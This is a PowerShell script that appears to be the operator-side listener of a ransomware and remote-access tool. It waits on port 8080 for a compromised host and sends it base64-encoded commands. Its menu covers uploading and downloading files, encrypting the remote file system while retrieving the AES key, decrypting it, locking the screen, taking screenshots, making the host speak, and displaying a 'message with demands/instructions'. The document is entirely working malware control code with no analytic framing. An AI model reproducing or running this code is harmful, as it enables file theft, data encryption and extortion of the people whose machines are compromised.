
function PSHandler($port)
{
    $socket = New-Object System.Net.IPEndPoint([IPAddress]::Any,$port)

    $handler = New-Object System.Net.Sockets.TCPListener $socket 

    $handler.Start()

    Write-Host "Listening on: $port"

    while($true)
    {
        $client = $handler.AcceptTCPClient()

        if($client)
        {
            $remoteAddress = $client.Client.RemoteEndPoint.Address
            $remotePort    = $client.Client.RemoteEndPoint.Port 

            Write-Host "[*] Connection from: $remoteAddress | $remotePort"

            $stream = $client.GetStream()

            while($true)
            {
                $transmitter           = New-Object System.IO.StreamWriter($stream)
                $receiver              = New-Object System.IO.StreamReader($stream)
                $plaintext_cmd         = Read-Host "[*]>>>"
                $cmd                   = [System.Text.Encoding]::Unicode.GetBytes($plaintext_cmd)
                $cmd                   = [Convert]::ToBase64String($cmd)

                if($plaintext_cmd -eq '')
                {
                    $plaintext_cmd     = Read-Host "[*]>>>"
                    $cmd               = [System.Text.Encoding]::Unicode.GetBytes($plaintext_cmd)
                    $cmd               = [Convert]::ToBase64String($cmd)
                }

                if($cmd)
                {
                    try
                    {
                        if($plaintext_cmd | Select-String 'exit')
                        {
                            $transmitter.WriteLine($cmd)
                            $transmitter.Dispose()
                            $receiver.Dispose()
                            $client.Close()
                            exit
                        }
                        if($plaintext_cmd | Select-String 'send')
                        {
                            $transmission = '' 
                            $command     = $plaintext_cmd.Split(' ')[0] 
                            $filename    = $plaintext_cmd.Split(' ')[1] 
                            $filename    = Split-Path $filename -Leaf
                            $filecontent = Get-Content $filename -Encoding Byte
                            $filecontent = [System.Convert]::ToBase64String($filecontent)
                            $transmission = "$command#$filename#$filecontent"
                            $transmitter.WriteLine($transmission)
                            $transmitter.Flush()
                            $plaintext_cmd         = Read-Host "[*]>>>"
                            $cmd                   = [System.Text.Encoding]::Unicode.GetBytes($plaintext_cmd)
                            $cmd                   = [Convert]::ToBase64String($cmd)
                        }
                        if($plaintext_cmd | Select-String 'download')
                        {
                            $command  = $plaintext_cmd.Split(' ')[0]
                            $filename = $plaintext_cmd.Split(' ')[1]
                            $transmission = "$command $filename"  
                            $transmitter.WriteLine($transmission)
                            $transmitter.Flush()
                            Write-Host "[~] Awaiting download..."
                            $download = $receiver.ReadLine()
                            $content  = [System.Convert]::FromBase64String($download)
                            Set-Content -Path ".\$filename" -Value $content -Encoding Byte
                            Write-Host "[*] Downloaded: $filename "
                            $plaintext_cmd = Read-Host "[*]>>>"
                            $cmd           = [System.Text.Encoding]::Unicode.GetBytes($plaintext_cmd)
                            $cmd           = [Convert]::ToBase64String($cmd)
                        }
                        if($plaintext_cmd | Select-String 'encryptfs')
                        {
                            Write-Host "[~] Initiating the file system encryption sequence..."
                            $transmitter.WriteLine($plaintext_cmd)
                            $transmitter.Flush()
                            $download = $receiver.ReadLine()
                            $content  = [System.Convert]::FromBase64String($download)
                            $filename = 'aes.key'
                            Set-Content -Path ".\$filename" -Value $content -Encoding Byte
                            Write-Host "[*] Retrieved AES Keyfile: $filename "
                            $plaintext_cmd = Read-Host "[*]>>>"
                            $cmd           = [System.Text.Encoding]::Unicode.GetBytes($plaintext_cmd)
                            $cmd           = [Convert]::ToBase64String($cmd)
                        }
                        if($plaintext_cmd | Select-String 'decryptfs')
                        {
                            Write-Host "[~] Decrypting the remote host's file system..."
                            $transmission = '' 
                            $command      = 'decryptfs' 
                            $filename     = 'aes.key'
                            $filename     = Split-Path $filename -Leaf
                            $filecontent  = Get-Content $filename -Encoding Byte
                            $filecontent  = [System.Convert]::ToBase64String($filecontent)
                            $transmission = "$command#$filename#$filecontent"
                            $transmitter.WriteLine($transmission)
                            $transmitter.Flush()
                            Write-Host "[*] Decryption sequence complete on the remote host"
                            $cmd           = [System.Text.Encoding]::Unicode.GetBytes($plaintext_cmd)
                            $cmd           = [Convert]::ToBase64String($cmd)
                        }
                        if($plaintext_cmd | Select-String 'screenshot')
                        {
                            $transmitter.WriteLine($plaintext_cmd)
                            $transmitter.Flush()
                            Write-Host "[~] Waiting for the screen shot..."
                            $download = $receiver.ReadLine()
                            $segments = $download.Split('#')
                            $filename = $segments[0]
                            $data     = $segments[1]
                            $content  = [System.Convert]::FromBase64String($data)
                            Set-Content -Path ".\$filename" -Value $content -Encoding Byte 
                            Write-Host "[*] Retrieved: $filename "
                            $plaintext_cmd = Read-Host "[*]>>>"
                            $cmd           = [System.Text.Encoding]::Unicode.GetBytes($plaintext_cmd)
                            $cmd           = [Convert]::ToBase64String($cmd) 
                        }
                        if($plaintext_cmd | Select-String 'speak')
                        {
                            $command      = $plaintext_cmd.Split(' ')[0]
                            $segments     = $plaintext_cmd.Split(' ') 
                            $transmission = $command
                            $transmission += "#"
                            $text         = '' 
                            for($i = 1; $i -lt $segments.Length; $i++)
                            {
                                $text += $segments[$i]
                                $text += '#'
                            }
                            $text = [System.Text.Encoding]::Unicode.GetBytes($text)
                            $text = [Convert]::ToBase64String($text)
                            $transmission += $text
                            $transmitter.WriteLine($transmission)
                            $transmitter.Flush()
                            Write-Host "[*] Transmitted text to remote host for artifical vocalization "
                            $plaintext_cmd = Read-Host "[*]>>>"
                            $cmd           = [System.Text.Encoding]::Unicode.GetBytes($plaintext_cmd)
                            $cmd           = [Convert]::ToBase64String($cmd)
                        }
                        if($plaintext_cmd -eq 'lockscreen')
                        {
                            $transmitter.WriteLine('lockscreen')
                            $transmitter.Flush()
                            Write-Host "[*] Sent lock screen command"
                            $confirmation = $receiver.ReadLine()
                            $confirmation = [System.Text.Encoding]::Unicode.GetBytes($confirmation)
                            $confirmation = [System.Convert]::FromBase64String($confirmation)
                            Write-Host $confirmation
                            $plaintext_cmd = Read-Host "[*]>>>"
                            $cmd           = [System.Text.Encoding]::Unicode.GetBytes($plaintext_cmd)
                            $cmd           = [Convert]::ToBase64String($cmd) 
                        }
                        if($plaintext_cmd -eq 'staticmessage')
                        {
                            $transmitter.WriteLine('staticmessage')
                            $transmitter.Flush()
                            Write-Host "[*] Instructed the host to display the message with demands/instructions"
                            $confirmation = $receiver.ReadLine()
                            $confirmation = [System.Text.Encoding]::Unicode.GetBytes($confirmation)
                            $confirmation = [System.Convert]::FromBase64String($confirmation)
                            Write-Host $confirmation
                            $plaintext_cmd = Read-Host "[*]>>>"
                            $cmd           = [System.Text.Encoding]::Unicode.GetBytes($plaintext_cmd)
                            $cmd           = [Convert]::ToBase64String($cmd) 
                        }
                        if(($plaintext_cmd | Select-String 'clear') -or ($plaintext_cmd | Select-String 'cls') -or ($plaintext_cmd | Select-String 'Clear-Host'))
                        {
                            try
                            {
                                Clear-Host
                            }
                            catch
                            {
                                continue
                            }
                        }
                        if(($plaintext_cmd | Select-String 'menu'))
                        {
                            Write-Host "
                            [*] PowerShell - Handler - Help Menu
                            ------------------------------------
                            |              Options             |
                            ------------------------------------
                            1)  Transfer to host   - Syntax: 'send <filename>'     
                            2)  Download from host - Syntax: 'download <filename>'
                            3)  Encrypt filesystem - Syntax: 'encryptfs'
                            4)  Decrypt filesystem - Syntax: 'decryptfs'
                            5)  Lock screen        - Syntax: 'lockscreen'
                            6)  Take screenshot    - Syntax: 'screenshot'
                            7)  Speak via the host - Syntax: 'speak <phrase>'
                            8)  Display message    - Syntax: 'staticmessage'
                            9)  Invoke help        - Syntax: 'help'
                            10) Exit               - Syntax: 'exit' 
                            "
                            continue
                        }
                        else 
                        {
                            try
                            {
                                $transmitter.WriteLine($cmd)
                                $transmitter.Flush()
                            }
                            catch
                            {
                                continue
                            }   
                        }
                    }
                    catch
                    {
                        continue
                    }
                }

                $intake      = $receiver.ReadLine()
                $intake      = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($intake))
                $response    = $intake

                if($intake)
                {
                    Write-Host $response
                }
            }
            $stream.Close()
            $client.Close()
        }
    }
}

PSHandler 8080